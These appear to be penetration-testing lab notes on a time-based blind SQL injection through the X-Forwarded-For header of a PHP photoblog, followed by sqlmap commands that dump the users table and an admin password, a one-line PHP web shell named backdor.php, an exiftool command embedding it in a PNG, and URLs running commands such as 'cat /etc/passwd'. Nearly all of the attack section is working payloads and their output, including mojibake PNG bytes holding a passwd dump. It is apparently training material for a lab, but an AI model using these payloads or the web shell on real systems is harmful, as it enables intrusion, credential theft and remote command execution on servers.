=================
 Time Based SQLi 
=================

This course details the exploitation of a blind SQL injection in a PHP based website and how an attacker can use it to gain access to the administration pages. Then, using this access, the attacker will be able to gain code execution on the server by usnig a configuration issue.
The attack is divided into 3 steps:

1. Fingerprinting: to gather information on the web application and technologies in use.

2. Detection and exploitation of SQL injection: in this part, you will learn how Blind SQL injections work and how to exploit them in order to retrieve information.

3. Access to the administration pages and code execution: the last step in which you will gain access to the operating system and run commands.

:: Exploitation ::

- echo "HEAD / HTTP/1.1\r\nHost:10.0.0.200\r\nConnection:close\r\n\r\n" |netcat 10.0.0.200 80
- echo -en "HEAD / HTTP/1.1\r\nHost:10.0.0.200\r\nConnection:close\r\n\r\n" |netcat 10.0.0.200 80
- x-forwarded-for: 1' and sleep(1)='



::: Header Before Injection :::

- 

Host: 10.0.0.10
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive

::: Header After Injection :::

-

Host: 10.0.0.10
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
x-forwarded-for: 1' and sleep(1000000)='      <<< Injection >>>
Connection: keep-alive


=======================
Automating with Sqlmap
=======================

- sqlmap -u "http://10.0.0.200/" --headers="X-Forwarded-For: *" -- banner
- sqlmap -u "http://10.0.0.200/" --headers="X-Forwarded-For: *" --dbs
- sqlmap -u "http://10.0.0.200/" --headers="X-Forwarded-For: *" -D photoblog --tables
- sqlmap -u "http://10.0.0.200/" --headers="X-Forwarded-For: *" -D photoblog -T users --columns
- sqlmap -u "http://10.0.0.200/cat.php?id=2" --headers="X-Forwarded-For: *" --dbs

[Working Samples]

- sqlmap -u "http://victim_ip/cat.php?id=2" --headers="X-Forwarded-For: *" --banner

[02:35:02] [INFO] the back-end DBMS is MySQL
[02:35:02] [INFO] fetching banner
web server operating system: Linux Debian 6.0 (squeeze)
web application technology: PHP 5.3.3, Apache 2.2.16
back-end DBMS: MySQL 5.0
banner:    '5.1.63-0+squeeze1'

- sqlmap -u "http://victim_ip/vulnmodule.php?id=2" --headers="X-Forwarded-For: *" --dbs

available databases [2]:
[*] information_schema
[*] photoblog

- sqlmap -u "http://victim_ip/vulnmodule.php?id=2" --headers="X-Forwarded-For: *" -D photoblog --dump

Database: photoblog
Table: pictures
[3 entries]
+----+-----+-------------+---------+
| id | cat | img         | title   |
+----+-----+-------------+---------+
| 1  | 2   | hacker.png  | Hacker  |
| 2  | 1   | ruby.jpg    | Ruby    |
| 3  | 1   | cthulhu.png | Cthulhu |
+----+-----+-------------+---------+

- sqlmap -u "http://victim_ip/vulnmodule.php?id=2-" --headers="X-Forwarded-For: *" -D photoblog -T users --dump

Database: photoblog
Table: users
[1 entry]
+----+-------+---------------------------------------------+
| id | login | password                                    |
+----+-------+---------------------------------------------+
| 1  | admin | 8efe310f9ab3efeae8d410a8e0166eb2 (P4ssw0rd) |
+----+-------+---------------------------------------------+

Database: photoblog
Table: categories
[3 entries]
+----+--------+
| id | title  |
+----+--------+
| 1  | test   |
| 2  | ruxcon |
| 3  | 2010   |
+----+--------+


===================
 Uploading a Shell
===================

<?php $cmd=$_GET ['cmd']; system ($cmd); ?>

----- File Name -----
     backdor.php
---------------------

===================================
 Inecting Webshell php into an img
===================================

- exiftool  "-ccoment <=backdor.php" logo.png
- http://victim_ip/admin/uploads/1462138313.png/cmd.php?cmd=uname -a
- http://victim_ip/admin/uploads/1462138313.png/cmd.php?cmd=ifconfig
- http://victim_ip/admin/uploads/1462138313.png/cmd.php?cmd=cat /etc/passwd
- http://10.0.0.200/admin/uploads/nm-signal-50-secure.png/c.php?c=uname%20-a


â€°PNG  IHDR szzÃ´sBIT|dË† pHYs Ã— Ã—B(â€ºxtEXtSoftwarewww.inkscape.orgâ€ºÃ®<Ã¯IDATXâ€¦Ãâ€”]lÃ•Ã‡Ã·ÃÃ¬Ãz?Â¼Ã«Â;Å½Ã—vÃ¢â‚¬Ãâ‚¬Â«â€¦Âª}@Â¥EÂ´Å BÅ Å ÂÅ Ã’â€“RQ_Â¨*ZÂ©Ã­KÃ¤*}hUMÂÅ HMÂ¨Â£Â¨jÂ­T4&&PLUBH0"vn>Â°â€”uÃ¼ÂµÃ±z=^Â¯wggÃ®Ã­ÃƒxÂQIÂ¤JÃ´HW{Ã¯Â¬Ã¦Ã¼sÃ®Â¹GÃ§ Â­5Å¸Â¦Ã‰OUÃ½Ã¿Ã€Â¼Ã–Ã¾Ã’ZQjÂ¯Ã†Å¾Ã§Â½jâ„¢Ã²Ã‘Ã­Ã›Â¿â€˜Â¾Z===rÃ·Ã®Ã @\K9rÃ¸&a'Ã–Â¯oÂ¨Ã™Â¸Â¡AÂºÅ¾"3â€˜VÂ¶Â½Â°Å’Ã’_ÃœÂ¹Ã³ÃÃ¡OÃ²Ã±Ã˜ÂÃ“)Â¡LÃ¹Ã«â€¡Â»Ã“p [pÃ°Ã¥Æ’GÂ¹Ã½]Ã›Âº"Ã—Â·_''Â§Â¦<ÃÂºdÂ½lhhÅ’â€ÃJÃ¿Ãâ€”F>Ã‰OÂ³Â¤LÃ®Â¬Â®Â¯ `Ã‹Ã½â€º[Â·4Â­[WÃ3Â¿{â€ Â§Å¾zÅ SÂ§OÂ³gÃ2â„¢ "Ã¡ÃˆF3/Ã¶Ã¿`Ã¯Æ’ÃYÂ´ÃœÃºÂ£Ã§â€ :Â¯Ã PÃŸÂ¡Â®Mâ€ºÃ¯Ã©Â¸Â®Ã“|Ã³Ãâ€œÅ’ÂÂÃ‘Ã¹â„¢Ã˜Ã’Â¾â„¢#Ã½Ã½Ã”Â¯Â«ËœcÃ‡Â¡Â¾C]WÃ²Ã±Ã£ÃƒÂ·Ã½Ã°Â¹wÃ¾JÂâ‚¬Ã±Ã­Â«4Æ’Â¦Ã¹Ã¤M]Â·Kâ€¹Ã¼Ã¹pâ€ºÃ›Ãš0&fÃ€$ÂÂ¬KÃÃŸÃŸO$Âµâ€Ã£Ãœ%?Å¾ h qâ‚¬â€ -Ã¸ÃOÃ¶ Ã…/Ã¨Ã«Ã«3Å¸OÃ¸c0Ã Â¨Ã¥?,â€¹wTâ€¡wÃŸ{â€”x,F8Ã†4M&Ã‘Xâ€Â©Â©),Ã‹2JÅ½Ã³Â+Â¸ÃšUZ?ÃšÃ“3h>Ã±Ã[Ã²(FÃŠAÂ£{`Ã Ã¥ÂÃ›cu5Å½gM;Å¾5Ã­Â¸Ã…Ã¹â€”^9ÃºJ0hÃâ€ºH$E `222LÃÂº$ÂÂªÃ¸Ë†H$â€šÂ½h#â€°}ÃÃ­Ã»Ã˜6Ã¬}Â°;Âº`Â·$nâ€šÂ¤Ã-rÃ¥Ã‹Æ’nÂ¥Ã´Â§Ã–Ã”Ã¦Ã†ÃvÃŸjâ€¦â€š5Ã–Ã¤Ã¤T(ÂªÃ¹J(Â²Å¡â€º6a/ÃšLNNÂÃ‡1Ã‚01LÃƒ0Â¨ Ã—ÂNÂ§ ZÃÂWÂ©lÂ¯ ?Ã–{Ã¦[==Æ’+ÃµFÂ¼Â¡Â·ÃºSÂÃ‘JÃºÂ§Ã:yÂ¤ySKcjSÅ Ã·Ã‡.Ã°Ãš?^#â€¹pÃ³ÂÃ,Ã¤Ë†Ã†bÃŒÃÃâ€¡ YÃ–Å¡Â¯7|ÃƒÃ€ ZLNNâ€˜Â¬KÃ‡Ã­Â¨hÃ… â€¦â€“Ã¤Ã­ZÃ¨ ÂÃ¨ÃZ|:%Ã¯Ã»Ã¦}Â»Ã¢KÃ‰DLd2XVÂxmÃ‹Â²XÂ°ÃŒÃ§Ã³Ã¿â€¹Â·â€ ÃÂ¦Â°XÃ€4MÃ“7iâ‚¬FkÂÃ§V6W$Å“VB=ÂºÂ²ÃŠâ‚¬jÃ¶Qeâ‚¬â€Ã¬Ã¨Ã˜ÃºH]Â²Ã*â€¢KÃ¤Ã¦sLL\$TÂ¢aÃƒFJÂ¥Ã¹â€¦<Â@â‚¬Ã§ÃÃ“ÃšÃ–B[[CCoÂ³Â´TÃ„Â¬Å CJâ€šÃ Â®[ÃuÂ½MÂ«ÂÅ’ÂNHÂ¥&@Â¤Ã¼-02BÃ"GÃŸ;Â»Â­â€˜Bâ€™Ã‹Ã¥ËœÂÂ 5Â¡Ã¦Ã³Ã³,-Ëœ6MÃ©Ã¬Â¼Å¾Ã¶Ã¶-Â¤Ã“Ã©5Ã¢RJÂ¤â€T*.J{ÂªÃ¯CQCâ€¡3@ Ã â€¦>RRÂ±^kÂÃ§yÃŒÃLS\.Ã¢â€@3?Å¸Â£\.# Æ’{â€˜Â²Ã£0;â€º%Â233Æ’Â¬F`E\Jâ€°R ÃÃ³Â¢Â«Ã©_Ë†Ã™@-@Â¡Ã¤iâ€_Ã½( MÂ¥Ã•Ã™â€šÂ½xcÃ¶Râ€“Â²Ã£ 5,â€”â€“Â¹47â€¡Ã«V@Æ’Ã£8â€Ãƒ5dÂ³Yâ€Ã’ÃŒNÃÂ°Â±q#â€ !â€˜B Â¥@HÂÂ­^Ã…-T5Â¬DÂ±I)255Ã¥ÂPÂºÃœÅ &-Â¥Ã Ã¸|~AÃÃŒÃŒP\.( LN^Ã„);HCRvJÃ„Â¢1fÂ¦gHÂ§Ã“ÃŒÃ¥rtlÃ«@ â€°Â!$BÃ¸ Â¨xÃ®lÃ€sÂ½Â¾Â¨Ã-TÃ§RÂ·iâ€”Bâ€ºÂ½Å½SÂ®LMMÂ±\,!Ã˜Ã¶"Â£Â£Ã¯Ã¡8JiÃŠÂ¥2Ã­[Â·`Ã‹Â²Â¸Ã«Â«wâ€™Â¬Â«[â€šÃ•Â¹Ã’ Ã—Ãµ.~fqË†)Å’4iÃ¿Ã&!-Ã»ÃºÃºâ€ â€¡RÂ¿â€¡5â€˜Ã–Ãš[#ZZÃ³Â»Ã¼Ã¢â€¹{;Â8sÃ¦7Ã•Ãœâ€šaËœ&Â£Ã§Ã‘ÃÃÃ€Ã¸Ã˜x%â€”Ã‹Â½Ã°Ã¬Â³FÂ®Ã Ã·Ã°ÃˆÂ¾Â¡â‚¬Ã’Ã„]Â«Ã¶Ã¯Ã°â€˜{ÃJâ€¹Ã®Å¾_TÂ~Â¾ Ã†/d:vÃ¬Â¥Ã¡Â¦Â¦Â¦TgG'Â³Ã™YlÃ›&ÂcÃ›6gÃÅ¾r+ÃªÂ¡+â€°Â¯ÂµË†!ZÂ¥!^ÃœÂ»kÂ«}Y>j+â€°Â¥Â´Ã–Å¾Ã–Ãš=~Ã¼xÂ¾TqvÃ¬ÃŸ`Ã©Ã‚â€¦Ã³*â€¹Ã‘Ã˜ÃÃˆÃŒÃ´Â´8Â¶TrÂÂ»{{{â€”>  "D1 Å“ÂªÂ®Â¯Ã©bÂ°kÃ—Â½Â­ÃÃŸhÂ¥Â¾ ÂÃ‡Ã‘Ã:|Ã•7Â£ÂµvÃÃ¿kÃ»Ã”/Â§Ã¿5ÃŸÃµÂ£PÃ®h,4tEXtCommentroot:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/bin/sh bin:x:2:2:bin:/bin:/bin/sh sys:x:3:3:sys:/dev:/bin/sh sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/bin/sh man:x:6:12:man:/var/cache/man:/bin/sh lp:x:7:7:lp:/var/spool/lpd:/bin/sh mail:x:8:8:mail:/var/mail:/bin/sh news:x:9:9:news:/var/spool/news:/bin/sh uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh proxy:x:13:13:proxy:/bin:/bin/sh www-data:x:33:33:www-data:/var/www:/bin/sh backup:x:34:34:backup:/var/backups:/bin/sh list:x:38:38:Mailing List Manager:/var/list:/bin/sh irc:x:39:39:ircd:/var/run/ircd:/bin/sh gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh nobody:x:65534:65534:nobody:/nonexistent:/bin/sh libuuid:x:100:101::/var/lib/libuuid:/bin/sh mysql:x:101:103:MySQL Server,,,:/var/lib/mysql:/bin/false user:x:1000:1000:Debian Live user,,,:/home/user:/bin/bash Â£ÃBÃˆIENDÂ®B`



Database: photoblog
Table: stats
[22 entries]
+----------------------+---------+
| ip                   | count   |
+----------------------+---------+
| <blank>              | 1       |
| (SELECT (CASE WHEN ( | 1       |
| (SELECT (CHR(113)||C | 1       |
| (SELECT 5000 FROM(SE | 1       |
| (SELECT CHAR(113)+CH | 1       |
| (SELECT CONCAT(0x716 | 1       |
| ) AND (SELECT * FROM | 1       |
| ) AND (SELECT 4283 F | 1       |
| ) AND 1413=CONVERT(I | 1       |
| ) AND 2562=2562 AND  | 1       |
| ) AND 3600=(SELECT U | 1       |
| ) AND 8039=7125 AND  | 1       |
| ) AND 9514=CAST((CHR | 1       |
| );(SELECT * FROM (SE | 1       |
| );SELECT DBMS_PIPE.R | 1       |
| );SELECT PG_SLEEP(5) | 1       |
| 0                    | 1       |
| 1                    | 3       |
| 10.0.0.13            | 1180    |
| 10.0.0.8             | 20      |
| 9618                 | 1       |
| ;(SELECT * FROM (SEL | 1       |
+----------------------+---------+


Notes: 

- The param HEAD only show the header and avoid the entire page.
- The param CLOSE Tell the server to close the connection after processing the request.
- The param --exclude-sysdbs to avoid dumping the system databases/tables and only retrieve the ones not present by default.
- The param `--batch` will tell SQLMap to use the default behaviour and to avoid asking for user input.



https://www.youtube.com/watch?v=sGKFBTS_M3o